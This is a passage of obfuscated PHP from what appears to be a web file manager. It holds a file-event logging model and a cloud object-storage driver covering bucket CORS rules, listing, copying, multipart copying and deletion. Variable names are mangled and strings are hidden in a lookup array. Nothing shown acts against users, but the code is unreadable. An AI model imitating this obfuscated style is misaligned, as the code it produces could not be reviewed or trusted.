$Ëš¬÷í = array_merge($Ëš¬÷í, $ø¯ùùÏé); } $Ãäî­ñ«[$‹æóä‰] = array_unique($Ëš¬÷í); return $Ãäî­ñ«[$‹æóä‰]; } public function authTargetInfoMake($¨àíæöÎ) { $¶Æ‡²ºâ =& $_SERVER[ï»»·÷á]; $¸áß÷ö“ = array(); $–·¾¯û = array(); foreach ($¨àíæöÎ as $ÆšĞÜ°ù) { if ($ÆšĞÜ°ù[$¶Æ‡²ºâ[420]] == SourceModel::TYPE_USER) { $¸áß÷ö“[] = intval($ÆšĞÜ°ù[$¶Æ‡²ºâ[505]]); } else { if ($ÆšĞÜ°ù[$¶Æ‡²ºâ[420]] == SourceModel::TYPE_GROUP) { $–·¾¯û[] = intval($ÆšĞÜ°ù[$¶Æ‡²ºâ[505]]); } } } if ($¸áß÷ö“) { $¸áß÷ö“ = Model($¶Æ‡²ºâ[513])->userListInfo($¸áß÷ö“); } if ($–·¾¯û) { $Ã®¼¿ÀĞ = array($¶Æ‡²ºâ[1955] => array($¶Æ‡²ºâ[427], $–·¾¯û)); $–·¾¯û = Model($¶Æ‡²ºâ[521])->field($¶Æ‡²ºâ[2083])->where($Ã®¼¿ÀĞ)->select(); $–·¾¯û = array_to_keyvalue($–·¾¯û, $¶Æ‡²ºâ[1867]); } return array($¶Æ‡²ºâ[2084] => $¸áß÷ö“, $¶Æ‡²ºâ[2085] => $–·¾¯û); } public function authInfo($­Ù‹Ä¹š) { $ôü½¶ÌŸ =& $_SERVER[ï»»·÷á]; if ($­Ù‹Ä¹š[$ôü½¶ÌŸ[1971]]) { $À‰¨†¡ª = Model($ôü½¶ÌŸ[507])->listData($­Ù‹Ä¹š[$ôü½¶ÌŸ[1971]]); if (!$À‰¨†¡ª) { return !1; $Ã¶«ª¶ = Model($ôü½¶ÌŸ[507])->listData(); $şÏÔ—ìª = array_filter_by_field($Ã¶«ª¶, $ôü½¶ÌŸ[422], $ôü½¶ÌŸ[198]); return $şÏÔ—ìª; } $ö¶–É“Ù = array_field_key($À‰¨†¡ª, array($ôü½¶ÌŸ[399], $ôü½¶ÌŸ[32], $ôü½¶ÌŸ[422], $ôü½¶ÌŸ[1890], $ôü½¶ÌŸ[1891])); $ö¶–É“Ù[$ôü½¶ÌŸ[2086]] = $­Ù‹Ä¹š; return $ö¶–É“Ù; } else { return array($ôü½¶ÌŸ[428] => 0, $ôü½¶ÌŸ[1873] => $­Ù‹Ä¹š[$ôü½¶ÌŸ[2031]], $ôü½¶ÌŸ[429] => $ôü½¶ÌŸ[12], $ôü½¶ÌŸ[1890] => $ôü½¶ÌŸ[2087]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\x65\x5f\x65\166\145\156\164"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\146\165\156\143\164\151\x6f\x6e"), array("\144\x65\x73\x63", '', "\x69\x6e\163\x65\x72\x74\54\x75\x70\x64\x61\x74\x65\x2c\x73\x65\x6c\145\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($µû´šÍã, $œÔòşóÄ, $šÏòî = '') { $øöƒ¬¯Ş =& $_SERVER[ï»»·÷á]; if (!$this->eventSave) { return; } $©Ø©®Ş = Model($øöƒ¬¯Ş[1349])->sourceInfo($µû´šÍã); if (!$©Ø©®Ş) { return !1; } if ($this->isCacheEvent($©Ø©®Ş, $œÔòşóÄ)) { return; } if ($šÏòî && is_string($šÏòî)) { $šÏòî = array($øöƒ¬¯Ş[1906] => $šÏòî); } $š–øŸ±± = array($øöƒ¬¯Ş[426] => $µû´šÍã, $øöƒ¬¯Ş[2088] => $©Ø©®Ş[$øöƒ¬¯Ş[441]], $øöƒ¬¯Ş[2089] => $©Ø©®Ş[$øöƒ¬¯Ş[32]], $øöƒ¬¯Ş[518] => !empty($©Ø©®Ş[$øöƒ¬¯Ş[518]]) ? $©Ø©®Ş[$øöƒ¬¯Ş[518]] : $øöƒ¬¯Ş[12], $øöƒ¬¯Ş[1669] => USER_ID, $øöƒ¬¯Ş[431] => $œÔòşóÄ, $øöƒ¬¯Ş[1671] => $šÏòî); $this->addSystemLog($œÔòşóÄ, $š–øŸ±±); unset($š–øŸ±±[$øöƒ¬¯Ş[2089]], $š–øŸ±±[$øöƒ¬¯Ş[518]]); return $this->add($š–øŸ±±); } private function addSystemLog($¦’Ö¼‘è, $¡ÈŠÔıç) { $¾ìåú×Ò =& $_SERVER[ï»»·÷á]; if ($¦’Ö¼‘è == $¾ìåú×Ò[2090]) { $¦’Ö¼‘è = $¡ÈŠÔıç[$¾ìåú×Ò[462]][$¾ìåú×Ò[2091]]; } else { if (in_array($¦’Ö¼‘è, array($¾ìåú×Ò[1847], $¾ìåú×Ò[2092]))) { $¦’Ö¼‘è = $¡ÈŠÔıç[$¾ìåú×Ò[462]][$¾ìåú×Ò[767]]; } } $Æ¯—‰¨ = array_merge($¡ÈŠÔıç, array($¾ìåú×Ò[2093] => $¡ÈŠÔıç[$¾ìåú×Ò[411]], $¾ìåú×Ò[2094] => $¡ÈŠÔıç[$¾ìåú×Ò[2094]])); Hook::trigger($¾ìåú×Ò[2095], $¾ìåú×Ò[2096] . $¦’Ö¼‘è, $¡ÈŠÔıç); Model($¾ìåú×Ò[1811])->addLog($¾ìåú×Ò[2096] . $¦’Ö¼‘è, $Æ¯—‰¨); } private function isCacheEvent($ï¥â‹Éº, $Æí¤†») { if ($ï¥â‹Éº[$_SERVER[ï»»·÷á][420]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¿ ıÊÎÜ, $Õ°Öá) { $ù·îé‚ =& $_SERVER[ï»»·÷á]; $Ç«—‘š = Model($ù·îé‚[1349])->sourceInfo($¿ ıÊÎÜ); $ÀĞ¼êâ¹ = array($ù·îé‚[2091] => $Õ°Öá, $ù·îé‚[32] => $Ç«—‘š[$ù·îé‚[32]]); return $this->addEvent($¿ ıÊÎÜ, $ù·îé‚[2090], $ÀĞ¼êâ¹); } public function eventFileEdit($šïïŸ­Ğ) { $Ë¥Ò¨Ú =& $_SERVER[ï»»·÷á]; $ï ıéè = array($Ë¥Ò¨Ú[2097] => $_SERVER[$Ë¥Ò¨Ú[2098]], $Ë¥Ò¨Ú[2099] => strtolower(ACTION)); if (isset($GLOBALS[$Ë¥Ò¨Ú[7]][$Ë¥Ò¨Ú[2100]])) { $ï ıéè[$Ë¥Ò¨Ú[2100]] = $Ë¥Ò¨Ú[88]; } return $this->addEvent($šïïŸ­Ğ, $Ë¥Ò¨Ú[1837], $ï ıéè); } public function eventRecycle($¤»–ÀÀÊ, $Š±„÷İğ) { return $this->addEvent($¤»–ÀÀÊ, $_SERVER[ï»»·÷á][2092], $Š±„÷İğ); } public function eventRemove($šÀˆé†â) { $€»¤÷¦÷ =& $_SERVER[ï»»·÷á]; $ÔËÜĞ§Ü = Model($€»¤÷¦÷[1349])->sourceInfo($šÀˆé†â); $ïÌ¥§ï» = $ÔËÜĞ§Ü[$€»¤÷¦÷[32]]; return $this->addEvent($ÔËÜĞ§Ü[$€»¤÷¦÷[441]], $€»¤÷¦÷[1836], $ïÌ¥§ï»); } public function eventShare($Ì¤Í‡, $²©í¤Ò•) { return $this->addEvent($Ì¤Í‡, $_SERVER[ï»»·÷á][1847], $²©í¤Ò•); } public function eventMove($™Ãš·¿È, $Ê¯†§, $¶’¤¼µƒ) { $ŸÏóô—· =& $_SERVER[ï»»·÷á]; $·€Æçæ› = Model($ŸÏóô—·[1349]); $õş×°™È = $·€Æçæ›->sourceInfo($™Ãš·¿È); $ ò½à½ = $·€Æçæ›->sourceInfo($Ê¯†§); $ßÖ‚·–ã = $·€Æçæ›->sourceInfo($¶’¤¼µƒ); $÷¡¹¶Îı = array($ŸÏóô—·[1170] => $Ê¯†§, $ŸÏóô—·[2101] => $ ò½à½[$ŸÏóô—·[32]], $ŸÏóô—·[2079] => !empty($ ò½à½[$ŸÏóô—·[518]]) ? $ ò½à½[$ŸÏóô—·[518]] : $ŸÏóô—·[12], $ŸÏóô—·[1171] => $¶’¤¼µƒ, $ŸÏóô—·[2102] => $ßÖ‚·–ã[$ŸÏóô—·[32]], $ŸÏóô—·[2103] => !empty($ßÖ‚·–ã[$ŸÏóô—·[518]]) ? $ßÖ‚·–ã[$ŸÏóô—·[518]] : $ŸÏóô—·[12]); $this->addEvent($™Ãš·¿È, $ŸÏóô—·[557], $÷¡¹¶Îı); $õş×°™È = $·€Æçæ›->sourceInfo($™Ãš·¿È); $÷¡¹¶Îı = array($ŸÏóô—·[411] => $õş×°™È[$ŸÏóô—·[411]], $ŸÏóô—·[32] => $õş×°™È[$ŸÏóô—·[32]]); $this->addEvent($Ê¯†§, $ŸÏóô—·[2104], $÷¡¹¶Îı); } public function eventCopy($ÃØŠÎŒÄ) { $this->eventCreate($ÃØŠÎŒÄ, $_SERVER[ï»»·÷á][555]); } public function eventRename($ôÁÚîòğ, $·è¬„Ÿ›, $ëõ€Ò´Ê) { $®¸¨Öş’ =& $_SERVER[ï»»·÷á]; $»£¾ãÏé = array($®¸¨Öş’[1170] => $·è¬„Ÿ›, $®¸¨Öş’[1171] => $ëõ€Ò´Ê); return $this->addEvent($ôÁÚîòğ, $®¸¨Öş’[1364], $»£¾ãÏé); } public function eventAddComment($…ÃĞÙ¯, $ª¹ÑĞ€) { return $this->addEvent($…ÃĞÙ¯, $_SERVER[ï»»·÷á][2105], $ª¹ÑĞ€); } public function eventAddDesc($ªëÛøá£, $äş×¼ê·) { return $this->addEvent($ªëÛøá£, $_SERVER[ï»»·÷á][2106], $äş×¼ê·); } public function listBySource($í„ÃŠò©) { $®ÒÃ‚¨è =& $_SERVER[ï»»·÷á]; $²ïŒïê = Model($®ÒÃ‚¨è[1349])->sourceInfo($í„ÃŠò©); $¨ ™‚áÍ = array($®ÒÃ‚¨è[426] => $í„ÃŠò©); if ($²ïŒïê[$®ÒÃ‚¨è[419]] == $®ÒÃ‚¨è[88]) { $Ê¨å…ùß = Model($®ÒÃ‚¨è[1349])->listSearchChildren($í„ÃŠò©, 20000); $Ê¨å…ùß[] = $í„ÃŠò© . $®ÒÃ‚¨è[378]; $¨ ™‚áÍ = array($®ÒÃ‚¨è[411] => array($®ÒÃ‚¨è[7], $Ê¨å…ùß)); } $€°­¦‰ = $this->where($¨ ™‚áÍ)->order($®ÒÃ‚¨è[2107])->selectPage(); if ($€°­¦‰[$®ÒÃ‚¨è[366]][$®ÒÃ‚¨è[367]] == 0) { $€°­¦‰[$®ÒÃ‚¨è[366]][$®ÒÃ‚¨è[367]] = 1; $€°­¦‰[$®ÒÃ‚¨è[369]] = array(array($®ÒÃ‚¨è[426] => $í„ÃŠò©, $®ÒÃ‚¨è[2088] => $²ïŒïê[$®ÒÃ‚¨è[441]], $®ÒÃ‚¨è[1669] => $²ïŒïê[$®ÒÃ‚¨è[463]], $®ÒÃ‚¨è[431] => $®ÒÃ‚¨è[2108], $®ÒÃ‚¨è[432] => $²ïŒïê[$®ÒÃ‚¨è[201]], $®ÒÃ‚¨è[1671] => $®ÒÃ‚¨è[12])); } return $this->eventListParse($€°­¦‰, $í„ÃŠò©); } private function eventListParse($›ìµÒ›Ş, $–¹ÌñÈÚ) { $¿Ùêœë =& $_SERVER[ï»»·÷á]; $ÜÒ±Ïïï = $›ìµÒ›Ş[$¿Ùêœë[369]]; $×¾Ñ•õ’ = array_to_keyvalue($ÜÒ±Ïïï, $¿Ùêœë[12], $¿Ùêœë[411]); $µ´Æ‡‚¹ = array_to_keyvalue($ÜÒ±Ïïï, $¿Ùêœë[12], $¿Ùêœë[2094]); foreach ($ÜÒ±Ïïï as $”Ùâ­á«) { $•ËşË÷‰ = $”Ùâ­á«[$¿Ùêœë[462]]; if ($”Ùâ­á«[$¿Ùêœë[33]] == $¿Ùêœë[557] && isset($•ËşË÷‰[$¿Ùêœë[1170]])) { $×¾Ñ•õ’[] = $•ËşË÷‰[$¿Ùêœë[1170]] . $¿Ùêœë[12]; $×¾Ñ•õ’[] = $•ËşË÷‰[$¿Ùêœë[1171]] . $¿Ùêœë[12]; } if ($”Ùâ­á«[$¿Ùêœë[33]] == $¿Ùêœë[2104] && isset($•ËşË÷‰[$¿Ùêœë[411]])) { $×¾Ñ•õ’[] = $•ËşË÷‰[$¿Ùêœë[411]] . $¿Ùêœë[12]; } } $×¾Ñ•õ’ = array_merge($×¾Ñ•õ’, $µ´Æ‡‚¹, array($–¹ÌñÈÚ . $¿Ùêœë[12])); $×¾Ñ•õ’ = array_unique($×¾Ñ•õ’); $Ã™Ó¹Öø = array_unique(array_to_keyvalue($ÜÒ±Ïïï, $¿Ùêœë[12], $¿Ùêœë[1678])); $Êˆõ–¾á = Model($¿Ùêœë[534])->userListInfo($Ã™Ó¹Öø); $¹”ŸÔ±Ò = Model($¿Ùêœë[838])->sourceListInfo($×¾Ñ•õ’, !0); foreach ($ÜÒ±Ïïï as &$”Ùâ­á«) { if ($”Ùâ­á«[$¿Ùêœë[33]] == $¿Ùêœë[557] && isset($”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[1170]])) { $”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[1170]] = $¹”ŸÔ±Ò[$”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[1170]]]; $”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[1171]] = $¹”ŸÔ±Ò[$”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[1171]]]; } if ($”Ùâ­á«[$¿Ùêœë[33]] == $¿Ùêœë[2104] && isset($”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[411]])) { $”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[411]] = $¹”ŸÔ±Ò[$”Ùâ­á«[$¿Ùêœë[462]][$¿Ùêœë[411]]]; } $”Ùâ­á«[$¿Ùêœë[87]] = $¹”ŸÔ±Ò[$”Ùâ­á«[$¿Ùêœë[411]]]; $”Ùâ­á«[$¿Ùêœë[2109]] = $¹”ŸÔ±Ò[$”Ùâ­á«[$¿Ùêœë[2094]]]; if ($”Ùâ­á«[$¿Ùêœë[33]] == $¿Ùêœë[1836]) { $”Ùâ­á«[$¿Ùêœë[2109]] = $”Ùâ­á«[$¿Ùêœë[87]]; $”Ùâ­á«[$¿Ùêœë[2094]] = $”Ùâ­á«[$¿Ùêœë[2109]][$¿Ùêœë[411]]; $”Ùâ­á«[$¿Ùêœë[87]] = !1; $”Ùâ­á«[$¿Ùêœë[411]] = $¿Ùêœë[12]; } $”Ùâ­á«[$¿Ùêœë[2039]] = $Êˆõ–¾á[$”Ùâ­á«[$¿Ùêœë[1678]]]; } unset($”Ùâ­á«); $›ìµÒ›Ş[$¿Ùêœë[369]] = $ÜÒ±Ïïï; return $›ìµÒ›Ş; } public function removeBySource($ÃæÆò÷) { $Íëû£¤ú = array($_SERVER[ï»»·÷á][426] => $ÃæÆò÷); $this->where($Íëû£¤ú)->remove(); } } goto B±²‚‡£¦¦; a´™¥™ø : class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ÜÀé¥Ë­) { parent::__construct(); include_once SDK_DIR . $_SERVER[ï»»·÷á][1404]; $this->_init($ÜÀé¥Ë­); } public function _init($¿¼şÑğ¯) { $æ÷óÈìâ =& $_SERVER[ï»»·÷á]; $this->config = $¿¼şÑğ¯; foreach ($¿¼şÑğ¯ as $éËˆ­ => $¾±…Ş’¿) { if (isset($this->{$éËˆ­})) { $this->{$éËˆ­} = $¾±…Ş’¿; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($æ÷óÈìâ[1405] . LNG($æ÷óÈìâ[1406])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ä¤Ş¾Ñ¥ =& $_SERVER[ï»»·÷á]; $ğÏªèÔ = new OSS\Model\CorsConfig(); $úÉ–û¡ = new OSS\Model\CorsRule(); $úÉ–û¡->addAllowedOrigin($Ä¤Ş¾Ñ¥[1407]); $úÉ–û¡->addAllowedMethod($Ä¤Ş¾Ñ¥[1408]); $úÉ–û¡->addAllowedMethod($Ä¤Ş¾Ñ¥[1409]); $úÉ–û¡->addAllowedMethod($Ä¤Ş¾Ñ¥[1410]); $úÉ–û¡->addAllowedMethod($Ä¤Ş¾Ñ¥[1411]); $úÉ–û¡->addAllowedMethod($Ä¤Ş¾Ñ¥[160]); $úÉ–û¡->setMaxAgeSeconds(600); $úÉ–û¡->addExposeHeader($Ä¤Ş¾Ñ¥[1412]); $úÉ–û¡->addAllowedHeader($Ä¤Ş¾Ñ¥[1407]); $ğÏªèÔ->addRule($úÉ–û¡); try { $this->client->putBucketCors($this->bucket, $ğÏªèÔ); } catch (OSS\Core\OssException $§Ïµóä) { return !1; } return !0; } public function getBucketCors() { $Ô‹êªâÑ =& $_SERVER[ï»»·÷á]; $ª¦³å–ö = null; try { $ª¦³å–ö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Üğäòõâ) { return null; } if (!$ª¦³å–ö || !($üæÊ›Œ° = $ª¦³å–ö->getRules())) { return null; } $Íüü²±ì = $üæÊ›Œ°[0]->getAllowedOrigins(); $íœë¬È = $üæÊ›Œ°[0]->getAllowedMethods(); $«Ôš•‘Î = $üæÊ›Œ°[0]->getMaxAgeSeconds(); $ì¶ˆ”»· = $üæÊ›Œ°[0]->getExposeHeaders(); $æä³¯¬ = $üæÊ›Œ°[0]->getAllowedHeaders(); return array($Ô‹êªâÑ[188] => isset($Íüü²±ì[0]) ? $Íüü²±ì[0] : $Ô‹êªâÑ[12], $Ô‹êªâÑ[192] => $íœë¬È, $Ô‹êªâÑ[1413] => $«Ôš•‘Î, $Ô‹êªâÑ[1414] => isset($ì¶ˆ”»·[0]) ? $ì¶ˆ”»·[0] : $Ô‹êªâÑ[12], $Ô‹êªâÑ[190] => isset($æä³¯¬[0]) ? $æä³¯¬[0] : $Ô‹êªâÑ[12]); } public function isBucketCors() { $Í’—Æ =& $_SERVER[ï»»·÷á]; $ ´¥Ù¢¬ = $this->getBucketCors(); if (!$ ´¥Ù¢¬ || !is_array($ ´¥Ù¢¬)) { return !1; } if ($ ´¥Ù¢¬[$Í’—Æ[188]] != $Í’—Æ[189] || $ ´¥Ù¢¬[$Í’—Æ[190]] != $Í’—Æ[189]) { return !1; } $øûÊ“Ğ÷ = array_map($Í’—Æ[191], $ ´¥Ù¢¬[$Í’—Æ[192]]); if (!is_array($øûÊ“Ğ÷)) { $øûÊ“Ğ÷ = array(); } $¨‰×Õç¢ = array($Í’—Æ[193], $Í’—Æ[194], $Í’—Æ[195], $Í’—Æ[196], $Í’—Æ[197]); $ÉºÔÂÉî = array_diff($¨‰×Õç¢, $øûÊ“Ğ÷); return empty($ÉºÔÂÉî); } public function mkfile($è‚ÛİÉ”, $©Ñ”Æô¨ = '', $Åøàœ²— = REPEAT_RENAME) { $«¸³œ® = $this->setContent($è‚ÛİÉ”, $©Ñ”Æô¨); if ($«¸³œ® !== !1) { return $this->getPathOuter($è‚ÛİÉ”); } return !1; } public function mkdir($“¶Êêü‡, $ÂŞÛæå = REPEAT_SKIP) { if ($ÂŞÛæå && $this->_isFolder($“¶Êêü‡)) { return $this->getPathOuter($“¶Êêü‡); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($“¶Êêü‡)); } catch (OSS\Core\OssException $æìÌğ›Ï) { return !1; } return $this->getPathOuter($“¶Êêü‡); } private function fileList($¬¯Ûû‡è, $‡²º½è£ = '', $ï—õÓª¡ = 0) { $£öô‘× =& $_SERVER[ï»»·÷á]; $¬¯Ûû‡è = trim($¬¯Ûû‡è, $£öô‘×[8]); $Üú¥³Øô = empty($¬¯Ûû‡è) && $¬¯Ûû‡è !== $£öô‘×[198] ? $£öô‘×[12] : $¬¯Ûû‡è . $£öô‘×[8]; $ñáÂ§Äª = $£öô‘×[12]; $™­¦µŸñ = 1000; $û¯û®‘î = $è”ÌÀ¦× = array(); while (!0) { check_abort(); $ë†”Œ”Ñ = array($£öô‘×[1415] => $‡²º½è£, $£öô‘×[1416] => $Üú¥³Øô, $£öô‘×[1417] => $™­¦µŸñ, $£öô‘×[1418] => $ñáÂ§Äª); try { $„Ï£Å«­ = $this->client->listObjects($this->bucket, $ë†”Œ”Ñ); } catch (OSS\Core\OssException $´Ø¬­Õ) { break; } $ñáÂ§Äª = $„Ï£Å«­->getNextMarker(); $°Î Ûç¢ = $„Ï£Å«­->getObjectList(); $©Š·â = $„Ï£Å«­->getPrefixList(); foreach ($°Î Ûç¢ as $ğ–ò¸ï¾) { if ($ğ–ò¸ï¾->getKey() == $Üú¥³Øô) { continue; } $ÅÆê˜­ = $ğ–ò¸ï¾->getKey(); $·ë»‘é° = $ğ–ò¸ï¾->getSize(); $ÔŞÅûÜ = $ğ–ò¸ï¾->getLastModified(); $¥™Ü‘šÜ = $ï—õÓª¡ ? array($£öô‘×[32] => $ÅÆê˜­, $£öô‘×[76] => $·ë»‘é°, $£öô‘×[180] => strtotime($ÔŞÅûÜ)) : $ÅÆê˜­; $Ÿ»êñ±å = $·ë»‘é° == 0 && substr($ÅÆê˜­, strlen($ÅÆê˜­) - 1, 1) == $£öô‘×[8] ? !0 : !1; $ş®²üßİ = array($£öô‘×[76] => $·ë»‘é°, $£öô‘×[1419] => $·ë»‘é°, $£öô‘×[85] => strtotime($ÔŞÅûÜ), $£öô‘×[1420] => $ÔŞÅûÜ); $this->cacheMethodInfoSet($ÅÆê˜­, $Ÿ»êñ±å, $ş®²üßİ); if ($Ÿ»êñ±å) { $û¯û®‘î[] = $ÅÆê˜­; continue; } $è”ÌÀ¦×[] = $¥™Ü‘šÜ; } foreach ($©Š·â as $Ù–°éÆÙ) { $û¯û®‘î[] = $Ù–°éÆÙ->getPrefix(); $this->cacheMethodInfoSet($Ù–°éÆÙ->getPrefix(), !0); } if ($ñáÂ§Äª === $£öô‘×[12]) { break; } } $this->cacheMethodInfoSet($¬¯Ûû‡è, !0); return array($£öô‘×[82] => $û¯û®‘î, $£öô‘×[83] => $è”ÌÀ¦×); } public function copyFile($ù‰Ğ‡œÄ, $ËÚï ı) { $ÏÄÖëñÓ = $this->size($ù‰Ğ‡œÄ); if ($ÏÄÖëñÓ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ù‰Ğ‡œÄ, $this->bucket, $this->pathEncode($ËÚï ı)); } catch (OSS\Core\OssException $Ü¢şºİë) { return !1; } return $this->getPathOuter($ËÚï ı); } $¬Ä²ÖÙ¦ = $this->multiCopyObject($ù‰Ğ‡œÄ, $ËÚï ı, $ÏÄÖëñÓ); return $¬Ä²ÖÙ¦ ? $this->getPathOuter($ËÚï ı) : !1; } private function multiCopyObject($Ö½Î¨¿Ó, $Éõµ‚ê¡, $“Ñ„÷) { $§İÕÚ¸¹ =& $_SERVER[ï»»·÷á]; try { $¨€ğº’Ä = array(); if ($õóÑ§š½ = $this->hashMd5($Ö½Î¨¿Ó)) { $¨€ğº’Ä = array(OSS\OssClient::OSS_HEADERS => array($§İÕÚ¸¹[1421] => $õóÑ§š½)); } $×´é¬  = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Éõµ‚ê¡), $¨€ğº’Ä); $Äà†Ùõ· = 1; $È…«ã‘± = 0; $Áá™ıÂø = array(); $ïÕŒÏÃÎ = 1024 * 1024 * 10; $Ú±äúå­ = $this->client->generateMultiuploadParts($“Ñ„÷, $ïÕŒÏÃÎ); foreach ($Ú±äúå­ as $Ò¥ÊËÄ => $¾áŒŠŠ«) { $ıéø³Š‚ = $È…«ã‘± + (int) $¾áŒŠŠ«[$§İÕÚ¸¹[1422]]; $Œ½ÊÓÔş = (int) $¾áŒŠŠ«[$§İÕÚ¸¹[337]] + $ıéø³Š‚ - 1; $ÚñÑ±ö = array($§İÕÚ¸¹[1423] => $ıéø³Š‚, $§İÕÚ¸¹[1424] => $Œ½ÊÓÔş); $Áá™ıÂø[] = $this->client->uploadPartCopy($this->bucket, $Ö½Î¨¿Ó, $this->bucket, $this->pathEncode($Éõµ‚ê¡), $Äà†Ùõ·, $×´é¬ , $ÚñÑ±ö); $Äà†Ùõ· = $Äà†Ùõ· + 1; } $”£ÙŠŠª = array(); foreach ($Áá™ıÂø as $Ò¥ÊËÄ => $Ò­áá¶) { $”£ÙŠŠª[] = array($§İÕÚ¸¹[1425] => $Ò¥ÊËÄ + 1, $§İÕÚ¸¹[1426] => $Ò­áá¶); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Éõµ‚ê¡), $×´é¬ , $”£ÙŠŠª); } catch (OSS\Core\OssException $şŠüŞ‚) { return !1; } return !0; } public function moveFile($¢š×Ñ ×, $Ê¤ƒøø) { if ($this->copyFile($¢š×Ñ ×, $Ê¤ƒøø)) { $this->remove($¢š×Ñ ×); return $this->getPathOuter($Ê¤ƒøø); } return !1; } public function delFile($úÃ‚¡¾é) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($úÃ‚¡¾é)); } catch (OSS\Core\OssException $øÍÁ›ß¶) { return !1; } return !0; } public function delFolder($Å—À¤õÛ) { $ÃÁ©–§… =& $_SERVER[ï»»·÷á]; if (!$this->exist($Å—À¤õÛ)) { return !0; } $this->listItemCache = !1; $ƒ Ñµùø = $this->fileList($Å—À¤õÛ); $this->listItemCache = !0; $áïíç‰ü = trim($Å—À¤õÛ, $ÃÁ©–§…[8]) . $ÃÁ©–§…[8]; if (!empty($Å—À¤õÛ) && $Å—À¤õÛ !== $ÃÁ©–§…[198] && !in_array($áïíç‰ü, $ƒ Ñµùø[$ÃÁ©–§…[82]])) { $ƒ Ñµùø[$ÃÁ©–§…[82]][] = $áïíç‰ü; } $Ê´´œ¤– = $this->delByBatch($ƒ Ñµùø[$ÃÁ©–§…[83]]); if (!$Ê´´œ¤–) { return !1; } $Ê´´œ¤– = $this->delByBatch($ƒ Ñµùø[$ÃÁ©–§…[82]]); if (!$Ê´´œ¤–) { return !1; } return $this->delFile($áïíç‰ü); } private function delByBatch($Ì´àµÆø) { foreach (array_chunk($Ì´àµÆø, 1000) as $–†òÜ³å) { try { $this->client->deleteObjects($this->bucket, $–†òÜ³å); } catch (OSS\Core\OssException $ñàìİşà) { return !1; } } return !0; } public function rename($‰¼“Í€Ô, $‹øñÅÏå) { return $this->renameObject($‰¼“Í€Ô, $‹øñÅÏå); } private function fileInfo($”šËÄ, $Ÿğ¢˜¾ = false, $øêÆ–Ì = array()) { $½Í•ªö =& $_SERVER[ï»»·÷á]; $Åªª¡üÓ = array($½Í•ªö[32] => $this->pathThis($”šËÄ), $½Í•ªö[84] => $this->getPathOuter($”šËÄ), $½Í•ªö[33] => $½Í•ªö[200], $½Í•ªö[76] => isset($øêÆ–Ì[$½Í•ªö[76]]) ? $øêÆ–Ì[$½Í•ªö[76]] : 0, $½Í•ªö[174] => $this->ext($”šËÄ)); if ($Ÿğ¢˜¾) { return $Åªª¡üÓ; } $Åªª¡üÓ[$½Í•ªö[201]] = $Åªª¡üÓ[$½Í•ªö[85]] = 0; $Åªª¡üÓ[$½Í•ªö[202]] = $Åªª¡üÓ[$½Í•ªö[203]] = !0; if (empty($øêÆ–Ì)) { $ü ŠÏÁ‰ = $this->objectMeta($”šËÄ); if (!$ü ŠÏÁ‰) { return $Åªª¡üÓ; } $øêÆ–Ì = array($½Í•ªö[85] => strtotime($ü ŠÏÁ‰[$½Í•ªö[1420]]), $½Í•ªö[76] => $ü ŠÏÁ‰[$½Í•ªö[1419]] + 0); } if (isset($øêÆ–Ì[$½Í•ªö[76]])) { $Åªª¡üÓ[$½Í•ªö[76]] = $øêÆ–Ì[$½Í•ªö[76]]; } if (isset($øêÆ–Ì[$½Í•ªö[85]])) { $Åªª¡üÓ[$½Í•ªö[85]] = $øêÆ–Ì[$½Í•ªö[85]]; } if (isset($øêÆ–Ì[$½Í•ªö[180]]) && !trim($Åªª¡üÓ[$½Í•ªö[85]])) { $Åªª¡üÓ[$½Í•ªö[85]] = $øêÆ–Ì[$½Í•ªö[180]]; } return $Åªª¡üÓ; } private function folderInfo($£¿™£³, $ğ«ŸÅì = false, $Òø˜… = array()) { $õ°â†Í¡ =& $_SERVER[ï»»·÷á]; $‡õ”Ãä³ = array($õ°â†Í¡[32] => $this->pathThis($£¿™£³), $õ°â†Í¡[84] => $this->getPathOuter($õ°â†Í¡[8] . $£¿™£³), $õ°â†Í¡[33] => $õ°â†Í¡[75]); if ($ğ«ŸÅì) { return $‡õ”Ãä³; } $‡õ”Ãä³[$õ°â†Í¡[201]] = $‡õ”Ãä³[$õ°â†Í¡[85]] = 0; $‡õ”Ãä³[$õ°â†Í¡[202]] = $‡õ”Ãä³[$õ°â†Í¡[203]] = !0; if (empty($Òø˜…)) { $£¿™£³ = rtrim($£¿™£³, $õ°â†Í¡[8]) . $õ°â†Í¡[8]; $¾ú­ŠŸ© = $this->objectMeta($£¿™£³); if (!$¾ú­ŠŸ©) { return $‡õ”Ãä³; } $Òø˜… = array($õ°â†Í¡[201] => $¾ú­ŠŸ©[$õ°â†Í¡[511]][$õ°â†Í¡[1427]], $õ°â†Í¡[85] => strtotime($¾ú­ŠŸ©[$õ°â†Í¡[1420]])); } if (isset($Òø˜…[$õ°â†Í¡[85]])) { $‡õ”Ãä³[$õ°â†Í¡[85]] = 